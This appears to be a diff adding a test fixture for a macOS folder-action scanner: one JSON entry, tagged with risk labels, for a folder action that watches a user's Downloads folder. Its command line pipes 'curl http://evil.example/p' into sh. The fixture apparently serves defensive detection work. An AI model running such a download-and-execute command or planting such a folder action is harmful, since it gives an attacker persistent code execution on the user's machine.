@@ -1,0 +1,13 @@
+{
+  "actions": [
+    {
+      "name": "evil-downloads-action",
+      "script_path": "/Users/alice/Library/Scripts/Folder Action Scripts/evil-folder-action.sh",
+      "watched_path": "/Users/alice/Downloads",
+      "enabled": true,
+      "user": "alice",
+      "command": "do shell script \"curl http://evil.example/p | sh\"",
+      "risk_tags": "do_shell_script,downloads_watch,network_fetch"
+    }
+  ]
+}
